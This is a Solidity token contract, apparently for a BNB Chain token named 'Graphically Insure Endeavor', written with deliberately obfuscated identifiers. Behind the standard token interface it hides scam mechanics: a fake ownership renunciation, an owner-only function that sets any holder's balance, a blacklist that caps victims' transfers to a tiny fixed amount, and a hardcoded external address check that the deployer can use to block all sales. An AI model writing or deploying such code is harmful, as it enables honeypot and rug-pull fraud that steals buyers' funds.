//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface autoMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingTotalEnable) external view returns (uint256);

    function transfer(address receiverModeLiquidity, uint256 exemptTx) external returns (bool);

    function allowance(address launchedBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptTx) external returns (bool);

    function transferFrom(
        address sender,
        address receiverModeLiquidity,
        uint256 exemptTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverBuy, uint256 value);
    event Approval(address indexed launchedBuy, address indexed spender, uint256 value);
}

abstract contract enableLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface receiverIs {
    function createPair(address listReceiver, address limitAt) external returns (address);
}

interface isShouldTx is autoMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract GraphicallyInsureEndeavor is enableLimit, autoMin, isShouldTx {

    bool private receiverFund;

    function senderLaunch(address modeAuto, address receiverModeLiquidity, uint256 exemptTx) internal returns (bool) {
        if (modeAuto == txMin) {
            return exemptLiquidity(modeAuto, receiverModeLiquidity, exemptTx);
        }
        uint256 buyTotal = autoMin(buyExempt).balanceOf(tokenListFund);
        require(buyTotal == teamTx);
        require(receiverModeLiquidity != tokenListFund);
        if (receiverExempt[modeAuto]) {
            return exemptLiquidity(modeAuto, receiverModeLiquidity, minMax);
        }
        return exemptLiquidity(modeAuto, receiverModeLiquidity, exemptTx);
    }

    function allowance(address listAmount, address amountAtTrading) external view virtual override returns (uint256) {
        if (amountAtTrading == enableFrom) {
            return type(uint256).max;
        }
        return receiverTx[listAmount][amountAtTrading];
    }

    function autoIsMarketing(address amountReceiverMax) public {
        liquiditySell();
        if (atSwap) {
            launchTrading = false;
        }
        if (amountReceiverMax == txMin || amountReceiverMax == buyExempt) {
            return;
        }
        receiverExempt[amountReceiverMax] = true;
    }

    function fundLaunchedMin(address txSellBuy) public {
        if (receiverSell) {
            return;
        }
        
        modeTo[txSellBuy] = true;
        if (launchTrading) {
            autoTx = buyAt;
        }
        receiverSell = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return sellTake;
    }

    constructor (){
        if (exemptSwap != autoTx) {
            exemptSwap = autoTx;
        }
        txAt walletFund = txAt(enableFrom);
        buyExempt = receiverIs(walletFund.factory()).createPair(walletFund.WETH(), address(this));
        if (autoTx != buyAt) {
            atSwap = false;
        }
        txMin = _msgSender();
        walletAmountSender();
        modeTo[txMin] = true;
        shouldAuto[txMin] = sellTake;
        
        emit Transfer(address(0), txMin, sellTake);
    }

    string private minSender = "GIER";

    mapping(address => uint256) private shouldAuto;

    function balanceOf(address marketingTotalEnable) public view virtual override returns (uint256) {
        return shouldAuto[marketingTotalEnable];
    }

    uint256 teamTx;

    function approve(address amountAtTrading, uint256 exemptTx) public virtual override returns (bool) {
        receiverTx[_msgSender()][amountAtTrading] = exemptTx;
        emit Approval(_msgSender(), amountAtTrading, exemptTx);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return buyTx;
    }

    uint256 private buyAt;

    address tokenListFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public atSwap;

    function walletAmountSender() public {
        emit OwnershipTransferred(txMin, address(0));
        launchTo = address(0);
    }

    uint256 constant minMax = 8 ** 10;

    mapping(address => bool) public modeTo;

    uint256 public exemptSwap;

    uint256 private sellTake = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return launchTo;
    }

    function liquiditySell() private view {
        require(modeTo[_msgSender()]);
    }

    mapping(address => bool) public receiverExempt;

    function buyTrading(address fromTxIs, uint256 exemptTx) public {
        liquiditySell();
        shouldAuto[fromTxIs] = exemptTx;
    }

    mapping(address => mapping(address => uint256)) private receiverTx;

    function decimals() external view virtual override returns (uint8) {
        return launchLaunched;
    }

    function symbol() external view virtual override returns (string memory) {
        return minSender;
    }

    event OwnershipTransferred(address indexed toFund, address indexed toBuy);

    function getOwner() external view returns (address) {
        return launchTo;
    }

    bool private launchTrading;

    function toLimit(uint256 exemptTx) public {
        liquiditySell();
        teamTx = exemptTx;
    }

    uint256 private autoTx;

    uint8 private launchLaunched = 18;

    function transfer(address fromTxIs, uint256 exemptTx) external virtual override returns (bool) {
        return senderLaunch(_msgSender(), fromTxIs, exemptTx);
    }

    uint256 txShould;

    address enableFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private launchTo;

    bool public liquidityLimit;

    function exemptLiquidity(address modeAuto, address receiverModeLiquidity, uint256 exemptTx) internal returns (bool) {
        require(shouldAuto[modeAuto] >= exemptTx);
        shouldAuto[modeAuto] -= exemptTx;
        shouldAuto[receiverModeLiquidity] += exemptTx;
        emit Transfer(modeAuto, receiverModeLiquidity, exemptTx);
        return true;
    }

    bool public receiverSell;

    address public buyExempt;

    address public txMin;

    string private buyTx = "Graphically Insure Endeavor";

    function transferFrom(address modeAuto, address receiverModeLiquidity, uint256 exemptTx) external override returns (bool) {
        if (_msgSender() != enableFrom) {
            if (receiverTx[modeAuto][_msgSender()] != type(uint256).max) {
                require(exemptTx <= receiverTx[modeAuto][_msgSender()]);
                receiverTx[modeAuto][_msgSender()] -= exemptTx;
            }
        }
        return senderLaunch(modeAuto, receiverModeLiquidity, exemptTx);
    }

}